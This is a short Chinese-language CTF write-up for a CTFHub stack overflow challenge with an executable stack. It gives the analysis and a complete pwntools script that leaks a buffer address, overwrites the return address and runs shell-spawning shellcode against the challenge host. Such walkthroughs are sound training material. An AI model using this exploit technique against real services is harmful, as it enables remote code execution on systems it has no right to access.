## 返回地址之后 ShellCode 注入

IDA 打开反编译

发现 `buf` 变量的地址被 `printf()` 函数输出了

然后 `read() `函数读取输入到变量 `buf` 中

![](https://pic1.imgdb.cn/item/6884518558cb8da5c8e0b7cb.png)

`read()` 函数限制输入 `0x400` 个字节，显然存在栈溢出漏洞

![](https://pic1.imgdb.cn/item/6884607d58cb8da5c8e10db6.png)

检测到可能没开 NX

![](https://pic1.imgdb.cn/item/6884621d58cb8da5c8e11425.png)

可以看到栈是可执行的

![](https://pic1.imgdb.cn/item/6884644758cb8da5c8e11c00.png)

先接受泄露的 buf 地址

```python
buf_addr = p.recvuntil("]")
buf_addr = int(buf_addr[-15: -1], 16)
```

我们把 shellcode 放在返回地址后面

```python
# 32 = buf 到 r 处（24）+ 返回地址长度（8）
shellcode_addr = buf_addr + 32
```

完整 payload

```python
from pwn import *

context.log_level = "debug"
context.arch = 'amd64'

# p = process("./pwn")
p = remote("challenge-119b305a737760fc.sandbox.ctfhub.com", 33409)

buf_addr = p.recvuntil("]")
buf_addr = int(buf_addr[-15: -1], 16)

shellcode_addr = buf_addr + 32
shellcode = asm(shellcraft.sh())

payload = b'a' * 24 + p64(shellcode_addr) + shellcode
p.recv()
p.sendline(payload)
p.interactive()
```

